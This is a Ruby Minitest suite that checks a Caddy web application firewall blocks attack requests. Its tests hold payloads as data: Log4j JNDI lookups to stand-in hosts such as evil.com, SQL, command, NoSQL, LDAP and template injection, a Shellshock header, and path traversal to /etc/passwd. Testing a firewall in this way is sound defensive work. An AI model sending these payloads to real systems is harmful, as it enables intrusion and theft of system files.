require 'minitest/autorun'
require 'rack/test'
require_relative 'app'
require_relative 'server_manager'

class TestApp < Minitest::Test
  include Rack::Test::Methods
  include ServerManager

  def app
    App.new
  end


  def setup
    setup_servers
  end


  def teardown
    cleanup_servers
  end

  def test_caddy_validate
    result = system("../dist/caddy-darwin-arm64 validate --config Caddyfile")
    assert result, "Caddy validation failed"
  end

  def test_root_endpoint
    get '/'
    assert_equal 200, last_response.status
    assert_includes last_response.body.to_s, 'Hello from Ruby/Rack!'
  end

  def test_health_endpoint
    get '/health'
    assert_equal 200, last_response.status
    assert_equal 'application/json', last_response.content_type
    assert_includes last_response.body.to_s, 'healthy'
  end

  def test_api_test_endpoint
    get '/api/test'
    assert_equal 200, last_response.status
    assert_equal 'application/json', last_response.content_type
    assert_includes last_response.body, 'test response'
  end

  def test_not_found
    get '/nonexistent'
    assert_equal 404, last_response.status
    assert_includes last_response.body, '404 Not Found'
  end

  def test_server_running
    response = make_request_through_caddy('/health')
    assert_equal 200, response.status
    assert_includes response.body.to_s, 'healthy'
  end

  def make_request_through_caddy(path, headers = {}, params = {})
    make_request_to_caddy(path, headers, params)
  end


  # WAF Rule Tests - Testing defensive security rules based on rules.json

  def test_waf_rule_100001_php_file_block
    # Block PHP file access attempts
    response = make_request_through_caddy('/index.php')
    assert_equal 403, response.status, "PHP file access should be blocked by WAF"

    response = make_request_through_caddy('/admin.php')
    assert_equal 403, response.status, "PHP file access should be blocked by WAF"
  end

  def test_waf_rule_100002_penetration_testing_probes
    # Block penetration testing probes
    response = make_request_through_caddy('/wp-admin/')
    assert_equal 403, response.status, "wp-admin access should be blocked by WAF"

    response = make_request_through_caddy('/phpmyadmin/')
    assert_equal 403, response.status, "phpmyadmin access should be blocked by WAF"

    response = make_request_through_caddy('/.env')
    assert_equal 403, response.status, ".env file access should be blocked by WAF"
  end

  def test_waf_rule_100003_log4j_injection
    # Block Log4j injection attempts
    response = make_request_through_caddy('/', {'User-Agent' => '${jndi:ldap://malicious.com/a}'})
    assert_equal 403, response.status, "Log4j injection in User-Agent should be blocked by WAF"

    # For ARGS targeting, use manual query string since WAF examines the entire query string
    response = make_request_through_caddy('/?data=${jndi:rmi://evil.com}')
    assert_equal 403, response.status, "Log4j injection in arguments should be blocked by WAF"
  end

  def test_waf_rule_100004_sql_injection
    # Block system file access and SQL injection attempts
    # Rule 100004 now includes URL-encoded patterns for ARGS
    response = make_request_through_caddy("/?query=' OR 1=1")
    assert_equal 403, response.status, "SQL injection in ARGS should be blocked by WAF"

    # Test DROP TABLE pattern
    response = make_request_through_caddy('/?sql=DROP TABLE users')
    assert_equal 403, response.status, "SQL injection DROP TABLE should be blocked by WAF"

    # Test system file access in URI path (rule targets URI) - these work!
    response = make_request_through_caddy('/proc/version')
    assert_equal 403, response.status, "System file access should be blocked by WAF"

    response = make_request_through_caddy('/etc/passwd')
    assert_equal 403, response.status, "System file access should be blocked by WAF"
  end

  def test_waf_rule_100005_command_injection
    # Block command injection attempts
    response = make_request_through_caddy('/?cmd=; cat /etc/passwd')
    assert_equal 403, response.status, "Command injection should be blocked by WAF"

    response = make_request_through_caddy('/?input=`whoami`')
    assert_equal 403, response.status, "Command injection should be blocked by WAF"
  end

  def test_waf_rule_100006_struts_shellshock_xxe
    # Block Struts, Shellshock and XXE attacks
    response = make_request_through_caddy('/', {'User-Agent' => '() { :; }; echo vulnerable'})
    assert_equal 403, response.status, "Shellshock attack should be blocked by WAF"

    response = make_request_through_caddy('/', {'Content-Type' => 'opensymphony'})
    assert_equal 403, response.status, "Struts attack should be blocked by WAF"
  end

  def test_waf_rule_100007_file_inclusion
    # Block file inclusion attempts
    response = make_request_through_caddy('/?file=../../../etc/passwd')
    assert_equal 403, response.status, "Directory traversal should be blocked by WAF"

    response = make_request_through_caddy('/?include=file:///etc/passwd')
    assert_equal 403, response.status, "File inclusion should be blocked by WAF"
  end

  def test_waf_rule_100008_remote_code_execution
    # Block remote code execution attempts
    response = make_request_through_caddy('/?code=system("id")')
    assert_equal 403, response.status, "RCE system() should be blocked by WAF"

    response = make_request_through_caddy('/?eval=exec("whoami")')
    assert_equal 403, response.status, "RCE exec() should be blocked by WAF"
  end

  def test_waf_rule_100009_server_side_includes_xxe
    # Block server-side includes and XXE injection
    # Rule targets ARGS only
    # Test SSI pattern - use params to handle URL encoding properly
    response = make_request_through_caddy('/', {}, { cmd: '<!--#exec cmd="ls"-->' })
    assert_equal 403, response.status, "SSI should be blocked by WAF"

    # Test XXE pattern  
    response = make_request_through_caddy('/', {}, { xml: '<!entity test>' })
    assert_equal 403, response.status, "XXE should be blocked by WAF"
  end

  def test_waf_rule_100010_ldap_injection
    # Block LDAP injection attempts
    response = make_request_through_caddy('/?filter=(cn=*)')
    assert_equal 403, response.status, "LDAP injection should be blocked by WAF"

    response = make_request_through_caddy('/?search=(uid=admin)')
    assert_equal 403, response.status, "LDAP injection should be blocked by WAF"
  end

  def test_waf_rule_100011_nosql_injection
    # Block NoSQL injection attempts
    response = make_request_through_caddy('/?query={"$ne": null}')
    assert_equal 403, response.status, "NoSQL injection should be blocked by WAF"

    response = make_request_through_caddy('/?find={"$gt": ""}')
    assert_equal 403, response.status, "NoSQL injection should be blocked by WAF"
  end

  def test_waf_rule_100012_xpath_injection
    # Block XPath injection attempts
    response = make_request_through_caddy('/?xpath=//user[name="admin"]')
    assert_equal 403, response.status, "XPath injection should be blocked by WAF"

    response = make_request_through_caddy('/?query=//password')
    assert_equal 403, response.status, "XPath injection should be blocked by WAF"
  end

  def test_waf_rule_100013_template_injection
    # Block template injection attempts
    response = make_request_through_caddy('/?template={{7*7}}')
    assert_equal 403, response.status, "Template injection should be blocked by WAF"

    response = make_request_through_caddy('/?data={%set x=1%}')
    assert_equal 403, response.status, "Template injection should be blocked by WAF"
  end

  def test_waf_rule_100014_os_command_attempts
    # Block OS command attempts
    response = make_request_through_caddy('/?cmd=whoami')
    assert_equal 403, response.status, "OS command should be blocked by WAF"

    response = make_request_through_caddy('/?exec=uname -a')
    assert_equal 403, response.status, "OS command should be blocked by WAF"
  end

  def test_waf_rule_100015_suspicious_scanner_patterns
    # Block suspicious scanner patterns
    response = make_request_through_caddy('/', {'User-Agent' => 'scanner'})
    assert_equal 403, response.status, "Scanner user agent should be blocked by WAF"

    response = make_request_through_caddy('/', {'User-Agent' => 'python-requests/admin'})
    assert_equal 403, response.status, "Suspicious bot should be blocked by WAF"
  end

  def test_waf_rule_100016_system_file_access_path
    # Block system file access attempts via path
    response = make_request_through_caddy('/etc/passwd')
    assert_equal 403, response.status, "System file access should be blocked by WAF"

    response = make_request_through_caddy('/proc/version')
    assert_equal 403, response.status, "System file access should be blocked by WAF"
  end

  def test_waf_rule_100017_database_admin_panels
    # Block database admin panel access attempts
    response = make_request_through_caddy('/phpmyadmin/')
    assert_equal 403, response.status, "Database admin panel should be blocked by WAF"

    response = make_request_through_caddy('/mysql-admin/')
    assert_equal 403, response.status, "Database admin panel should be blocked by WAF"
  end

  def test_waf_rule_100018_admin_panel_access
    # Block admin panel access attempts
    response = make_request_through_caddy('/administrator/')
    assert_equal 403, response.status, "Admin panel should be blocked by WAF"

    response = make_request_through_caddy('/cpanel/')
    assert_equal 403, response.status, "Admin panel should be blocked by WAF"
  end

  def test_waf_rule_100019_config_version_control_files
    # Block config and version control file access
    response = make_request_through_caddy('/.git/config')
    assert_equal 403, response.status, "Git config should be blocked by WAF"

    response = make_request_through_caddy('/.htaccess')
    assert_equal 403, response.status, "htaccess should be blocked by WAF"
  end

  def test_waf_rule_100020_suspicious_file_extensions
    # Block suspicious file extensions
    response = make_request_through_caddy('/shell.jsp')
    assert_equal 403, response.status, "JSP files should be blocked by WAF"

    response = make_request_through_caddy('/backdoor.asp')
    assert_equal 403, response.status, "ASP files should be blocked by WAF"
  end

  def test_waf_rule_100021_config_database_log_files
    # Block config, database and log file access
    response = make_request_through_caddy('/config.ini')
    assert_equal 403, response.status, "Config files should be blocked by WAF"

    response = make_request_through_caddy('/database.sql')
    assert_equal 403, response.status, "Database files should be blocked by WAF"
  end

  def test_waf_rule_100022_archive_temp_files
    # Block archive and temporary file access
    response = make_request_through_caddy('/backup.zip')
    assert_equal 403, response.status, "Archive files should be blocked by WAF"

    response = make_request_through_caddy('/temp.tmp')
    assert_equal 403, response.status, "Temporary files should be blocked by WAF"
  end

  def test_normal_traffic_allowed
    # Test that normal legitimate traffic is allowed through Caddy
    response = make_request_through_caddy('/')
    assert_equal 200, response.status, "Normal traffic should be allowed"
    assert_includes response.body.to_s, 'Hello from Ruby/Rack!'

    response = make_request_through_caddy('/health')
    assert_equal 200, response.status, "Health endpoint should be accessible"
    assert_includes response.body.to_s, 'healthy'
  end
end
